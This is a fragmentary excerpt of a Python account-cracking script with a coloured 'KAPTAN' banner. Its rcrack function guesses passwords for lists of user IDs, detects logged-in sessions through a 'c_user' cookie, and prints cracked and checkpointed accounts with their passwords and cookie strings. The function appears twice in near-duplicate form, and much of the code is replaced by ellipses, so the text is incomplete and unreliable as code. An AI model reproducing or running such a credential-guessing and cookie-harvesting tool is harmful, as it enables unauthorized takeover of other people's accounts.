...
\033[1;37m=============================================================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mKAPTAN\33[0;m\033[1;32m && \033[1;33mKAPTAN\33[0;m
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36mNONE
\033[1;37m=============================================================
"""  
loop = 0
oks = []
...
def rcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\r\033[1;32m[DIL-OK] '+cid+' | '+ps)
				cek_apk(coki)
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[DIL-CP] '+cid+' | '+ps)
				...
				continue
		loop+=1
		sys.stdout.write(f"\r\x1b[1;32m[DIL-DIL]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [CP][{len(cps)}] ")
		sys.stdout.flush()
	except:
		pass
...
def rcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write(f"\r \x1b[1;32m[ DIL ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
		sys.stdout.flush()
	except:
		pass
menu_apikey()
